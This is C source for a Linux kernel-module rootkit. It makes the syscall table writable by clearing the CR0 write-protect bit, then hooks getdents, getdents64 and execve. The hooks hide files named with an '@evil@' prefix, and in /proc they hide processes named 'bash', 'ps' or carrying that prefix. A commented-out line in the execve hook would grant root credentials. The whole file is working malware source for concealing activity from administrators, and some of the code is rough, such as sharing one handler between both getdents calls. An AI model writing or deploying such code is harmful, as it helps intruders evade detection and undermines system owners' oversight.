#include <linux/kernel.h>
#include <linux/module.h>
#include <linux/unistd.h>
#include <asm/paravirt.h>
#include <linux/kallsyms.h>
#include <linux/gfp.h>
#include <linux/slab.h>
#include <linux/init.h>
#include <linux/types.h>
#include <linux/stat.h>
#include <linux/fcntl.h>
#include <linux/errno.h>
#include <linux/fs.h>
#include <linux/dcache.h>
#include <linux/namei.h>
#include <linux/path.h>
#include <linux/cred.h>
#include <linux/fdtable.h>
#include <linux/dcache.h>
unsigned long  **syscall_table;// = 0xffffffff81a00240;

typedef struct linux_dirent{
    unsigned long  d_ino;     /* Inode number */
    unsigned long  d_off;     /* Offset to next linux_dirent */
    unsigned short d_reclen;  /* Length of this linux_dirent */
    //char           d_type;    // File type (only since Linux 2.6.4;
    char           d_name[];  /* Filename (null-terminated) */
                        /* length is actually (d_reclen - 2 -
                           offsetof(struct linux_dirent, d_name) */
    /*
    char           pad;       // Zero padding byte*/
                              // offset is (d_reclen - 1))


}linux_dirent;


char* processes_to_hide[] = {"bash","ps"};//array to hold preset processes to hide

asmlinkage int (*original_getdents)(unsigned int,struct linux_dirent*, unsigned int);
asmlinkage int (*original_getdents64)(unsigned int,struct linux_dirent*, unsigned int);//not sure which one of the two constants the kernel uses
asmlinkage int (*original_execve)(const char *pathname, char *const argv[], char *const envp[]);

asmlinkage int new_getdents(unsigned int fd,struct linux_dirent* dirp,
                    unsigned int count){
    int bytesread = original_getdents(fd,dirp,count);
    int newBytes = bytesread;

    struct files_struct *current_files = current->files;// get current proccess file table
    spin_lock(&current_files->file_lock);//hold a lock on current files
    struct file *current_directory = fcheck_files(current_files,fd);//check if the directory passed into getdents exists
    if(current_directory){
        struct path *directory_path = &current_directory->f_path;//get the path structure of the directory
        path_get(directory_path); //increase the reference count so we do not lose this structure randomly
        char* name = (char*)kmalloc(256,GFP_KERNEL);//allocate memory for the directory name
        char* bufferPointer = d_path(directory_path,name,256);
        //printk("%s",bufferPointer);
        path_put(directory_path);//free the reference
        if(strcmp(bufferPointer,"/proc") == 0){//check if we are in /proc and perform hiding of processes
            //printk("Wow! we detected a enter into /proc");
            int psbytes;//this part is the same exact thing as below except now we will grab the director name which
                        //is the pid and then perform a pid lookup to see if its a directory we want to hide
            for(psbytes = 0; psbytes < newBytes;){
                linux_dirent* d = (linux_dirent*) (((void*)(dirp)) + psbytes);
                //printk("%s: bytes long: %d\n",d->d_name,d->d_reclen);
                int pid = 0;
                kstrtoint(d->d_name,10,&pid);
                //printk("%d",pid);
                if(pid != -EINVAL && pid != 0){
                    struct pid *process = find_get_pid(pid);
                    if(process == NULL){
                        psbytes += d->d_reclen;
                        continue;
                    }
                    struct task_struct* process_struct = pid_task(process,PIDTYPE_PID);
                    if(process_struct == NULL){
                        psbytes += d->d_reclen;
                        continue;
                    }
                    //printk("%s",process_struct->comm);
                    char* process_name =  process_struct->comm;

                    bool flag = false;
                    int i;
                    for(i = 0; i < sizeof(processes_to_hide)/sizeof(char*); i++){//check if the process is one of the listed override processes
                        if(strcmp(process_name,processes_to_hide[i]) == 0){
                            //printk("Match found for process to hide. Hiding from dirent entries.");
                            void* alteredBuffer = (((void*)(dirp)) + psbytes) + d->d_reclen;
                            int removedEntrySize = d->d_reclen;
                            int copySize = newBytes - psbytes - removedEntrySize;
                            memcpy(d,alteredBuffer,copySize);
                            newBytes -= removedEntrySize;
                            flag = true;
                            break;
                        }
                    }
                    if(flag){
                        continue;
                    }
                    if(strlen(process_name) < 6){//check if the name can even fit the prefix
                        psbytes += d->d_reclen;
                        continue;
                    }
                    if(strncmp(process_name,"@evil@",6)==0){//check if the process name has the prefix
                        //printk("Match found for process to hide. Hiding from dirent entries.");
                        void* alteredBuffer = (((void*)(dirp)) + psbytes) + d->d_reclen;
                        int removedEntrySize = d->d_reclen;
                        int copySize = newBytes - psbytes - removedEntrySize;
                        memcpy(d,alteredBuffer,copySize);
                        newBytes -= removedEntrySize;
                        continue;
                    }
                }

                psbytes += d->d_reclen;
            }
            spin_unlock(&current_files->file_lock);
            kfree(name);
            return newBytes;
        }
        kfree(name);
    }
    spin_unlock(&current_files->file_lock);//release the lock
    //printk("Current fd path:%p\n", current->files->fd_array[fd]->f_path/*.dentry->d_name.name*/);
    /*struct path* inodeInfoBuffer = (struct path*)kcalloc(1,sizeof(struct path),GFP_KERNEL);
    int errormessage = kern_path("/", LOOKUP_FOLLOW, inodeInfoBuffer);
    printk("error: %d",errormessage);
    printk("filesize = %d",inodeInfoBuffer->dentry->d_inode->i_size);   inode information
    printk("mode = %lu",inodeInfoBuffer->dentry->d_inode->i_mode);
    printk("sizeof modefield = %lu",sizeof(umode_t));*/


    //printk("succesfully executed getdents with %d bytes read, filename %s \n",bytesread, dirp->d_name);
    int bytes;
    for(bytes = 0; bytes < newBytes;){
        linux_dirent* d = (linux_dirent*) (((void*)(dirp)) + bytes);
        //printk("%s: bytes long: %d\n",d->d_name,d->d_reclen);
        //printk("inode number: %lu", d->d_ino);
        if(strlen(d->d_name) >= 6){
            if(strncmp(d->d_name,"@evil@",6) == 0){
                //printk("Match found for prefix. Hiding from dirent entries.");
                void* alteredBuffer = (((void*)(dirp)) + bytes) + d->d_reclen;
                int removedEntrySize = d->d_reclen;
                int copySize = newBytes - bytes - removedEntrySize;
                memcpy(d,alteredBuffer,copySize);
                newBytes -= removedEntrySize;
                continue;
            }
        }
        bytes += d->d_reclen;
    }
    //kfree(inodeInfoBuffer);
    //printk("hello world its getdents function");
    return newBytes;
}

asmlinkage int new_execve(const char *pathname, char *const argv[], char *const envp[]){
    //commit_creds(prepare_kernel_cred(0));
    //printk("Program name hooked: %s",pathname);
    return original_execve(pathname,argv,envp);

}

int init_module(){
    write_cr0 (read_cr0 () & (~ 0x10000));//necessary to make the sys_call_table writable
    syscall_table = (unsigned long**)kallsyms_lookup_name("sys_call_table");
    printk("loaded syscall table\n");
    original_getdents = (void*)syscall_table[__NR_getdents];//get original function
	original_getdents64 = (void*)syscall_table[__NR_getdents64];
    original_execve = (void*)syscall_table[__NR_execve];
    syscall_table[__NR_getdents64] = (unsigned long*)new_getdents;//replace function
	syscall_table[__NR_getdents] = (unsigned long*)new_getdents;
    syscall_table[__NR_execve] = (unsigned long*)new_execve;
    write_cr0 (read_cr0 () | 0x10000);//necessary to restore syscall table to read only
    return 0;
}

void cleanup_module(){
    write_cr0 (read_cr0 () & (~ 0x10000));
    syscall_table[__NR_getdents64] = ((unsigned long*)original_getdents64);//restore original functions
	syscall_table[__NR_getdents] = ((unsigned long*)original_getdents);
    syscall_table[__NR_execve] = ((unsigned long*)original_execve);
	printk("successfully unloaded kernel module");
    write_cr0 (read_cr0 () | 0x10000);
}

MODULE_LICENSE("GPL");
